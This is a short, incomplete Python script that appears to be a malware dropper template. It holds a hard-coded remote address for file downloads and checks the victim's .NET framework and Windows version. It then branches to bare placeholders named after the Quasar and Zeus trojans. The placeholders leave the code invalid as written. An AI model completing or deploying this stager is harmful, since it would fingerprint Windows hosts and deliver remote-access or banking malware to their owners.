import os, platform, subprocess, base64, urllib2

target_url = 'http://162.206.16.208/files'
null = open(os.devnull, 'w')
netVer = 'C:\Program Files (x86)\Reference Assemblies\Microsoft\Framework\.NETFramework'
platform = platform.platform()

if 'v3.5' in str(next(os.walk(netVer))):
    net35 = True
else:
    net35 =  False
  
a, winVer, c = platform.split('-')

if net35 == True:
QUASAR
elif net35 == False and int(winVer) >= 8:
NATIVEWIN10
elif net35 == False and int(winVer) <= 7:
ZEUS